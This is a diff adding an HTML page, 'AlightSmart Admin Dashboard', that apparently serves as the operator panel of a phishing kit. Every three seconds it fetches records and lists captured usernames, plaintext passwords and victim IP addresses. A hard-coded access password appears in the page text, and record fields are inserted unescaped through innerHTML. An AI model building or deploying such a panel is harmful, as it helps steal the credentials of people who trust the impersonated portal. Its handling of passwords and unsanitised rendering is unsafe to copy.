@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AlightSmart Admin</title>
+    <style>
+        body { font-family: Arial; padding: 20px; background: #f0f0f0; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { padding: 12px; border: 1px solid #ccc; text-align: left; }
+        th { background: #1e40af; color: white; }
+    </style>
+</head>
+<body>
+    <h1>AlightSmart Admin Dashboard</h1>
+    <p>Password: tunde6035</p>
+    <table id="table">
+        <thead>
+            <tr>
+                <th>Time</th>
+                <th>Type</th>
+                <th>Username</th>
+                <th>Password</th>
+                <th>IP</th>
+            </tr>
+        </thead>
+        <tbody></tbody>
+    </table>
+
+    <script>
+        async function loadRecords() {
+            const res = await fetch('/api/records');
+            const records = await res.json();
+            const tbody = document.querySelector('#table tbody');
+            tbody.innerHTML = "";
+            records.forEach(r => {
+                tbody.innerHTML += `<tr>
+                    <td>${r.timestamp}</td>
+                    <td>${r.type}</td>
+                    <td>${r.username || '-'}</td>
+                    <td>${r.password ? r.password : '-'}</td>
+                    <td>${r.ip}</td>
+                </tr>`;
+            });
+        }
+        setInterval(loadRecords, 3000);
+        window.onload = loadRecords;
+    </script>
+</body>
+</html>
